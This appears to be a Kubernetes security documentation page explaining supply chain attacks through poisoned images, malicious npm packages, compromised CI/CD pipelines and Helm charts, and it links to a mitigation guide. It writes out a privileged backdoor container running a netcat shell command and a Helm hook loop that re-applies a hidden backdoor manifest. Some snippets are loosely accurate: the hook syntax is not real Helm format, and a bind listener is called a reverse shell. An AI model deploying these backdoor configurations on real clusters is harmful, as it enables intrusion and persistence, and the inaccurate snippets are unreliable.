---
sidebar_position: 5
title: "Supply Chain Attacks"
description: "How attackers compromise container images, dependencies, CI/CD pipelines, and Helm charts to infiltrate Kubernetes clusters."
---

# Supply Chain Attacks

A **supply chain attack** in Kubernetes involves **compromising container images, software dependencies, CI/CD pipelines, or Helm charts** to inject malicious code into workloads. Attackers use these vulnerabilities to **gain initial access, escalate privileges, and exfiltrate sensitive data**.

---

## Exploitation Steps: Compromising the Software Supply Chain

An attacker injects malicious code into a Kubernetes deployment by exploiting weaknesses in the container build process.

### Step 1: Poison a Public Image

The attacker publishes a **malicious container image** to a public registry:

```bash
docker build -t attacker/malicious-app .
docker push docker.io/attacker/malicious-app
```

If an organization unknowingly pulls this image, it introduces malicious code into production.

### Step 2: Exploit Weak Image Verification

An organization deploys a container without verifying its source:

```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: vulnerable-app
spec:
  template:
    spec:
      containers:
        - name: app
          image: docker.io/attacker/malicious-app
```

Since no image signing or verification is enforced, the compromised container runs in the cluster.

### Step 3: Inject Malicious Dependencies

If the CI/CD pipeline **does not validate third-party dependencies**, the attacker injects a malicious package into a widely used library.

Example of an attacker publishing a compromised package:

```bash
npm publish compromised-library
```

Developers unknowingly include this package in their applications, allowing remote code execution.

### Step 4: Compromise CI/CD Pipeline

The attacker exploits misconfigured CI/CD secrets to modify Kubernetes manifests:

```bash
kubectl apply -f attacker-modified-deployment.yaml
```

By injecting malicious configurations, the attacker gains persistent access to the cluster.

---

## Exploitation Steps: Deploying a Malicious Helm Chart

An attacker manipulates Helm charts to introduce **unauthorized workloads, privilege escalation, or backdoors** into a Kubernetes cluster.

### Step 1: Publish a Malicious Helm Chart

The attacker creates a Helm chart containing **hidden malicious configurations**:

```yaml
apiVersion: v2
name: malicious-app
version: 1.0.0
description: "A vulnerable Helm chart"
```

**Example of Malicious Workload in Values.yaml**:

```yaml
containers:
  - name: backdoor-container
    image: attacker/malicious-image
    securityContext:
      privileged: true
    command: ["/bin/sh", "-c"]
    args: ["while true; do nc -lvp 9001 -e /bin/sh; done"]
```

The attacker **uploads the chart** to a public Helm repository:

```bash
helm package malicious-app
helm push malicious-app-1.0.0.tgz oci://public-helm-repo
```

### Step 2: Exploit Unverified Helm Chart Usage

An unsuspecting user installs the chart **without verifying its integrity**:

```bash
helm repo add untrusted-repo oci://public-helm-repo
helm install vulnerable-app untrusted-repo/malicious-app
```

The **malicious container is deployed**, providing the attacker with a **reverse shell**.

### Step 3: Escalate Privileges Using a Malicious PodSecurityPolicy

If **Pod Security Policies (PSP) or admission controls** are not enforced, the attacker modifies Helm templates to allow privilege escalation:

```yaml
apiVersion: policy/v1beta1
kind: PodSecurityPolicy
metadata:
  name: privileged-psp
spec:
  privileged: true
  runAsUser:
    rule: RunAsAny
  seLinux:
    rule: RunAsAny
```

```bash
helm install --set securityPolicy.privileged=true exploit-app
```

The attack **bypasses Kubernetes security policies**, allowing **root access** on worker nodes.

### Step 4: Persist in the Cluster

The attacker modifies **Helm hooks** to maintain persistence after deletion:

```yaml
hooks:
  post-delete:
    - exec:
        command:
          [
            "/bin/sh",
            "-c",
            "while true; do sleep 60; kubectl apply -f /tmp/hidden-backdoor.yaml; done",
          ]
```

Even if the Helm release is removed:

```bash
helm uninstall exploit-app
```

The malicious workload **remains active**, ensuring long-term access.

### Result

The attacker has **infiltrated the Kubernetes environment** via a compromised supply chain, enabling **persistent access, privilege escalation, and data theft**.

---

## Mitigation Steps

To protect against **supply chain attacks**, follow the security best practices outlined in:

➡ **[Securing the Kubernetes Supply Chain](/docs/best_practices/supply_chain_mitigation)**

This guide covers techniques such as **container image signing, vulnerability scanning, CI/CD hardening, Helm security enforcement, and dependency verification** to prevent attackers from compromising the software supply chain.
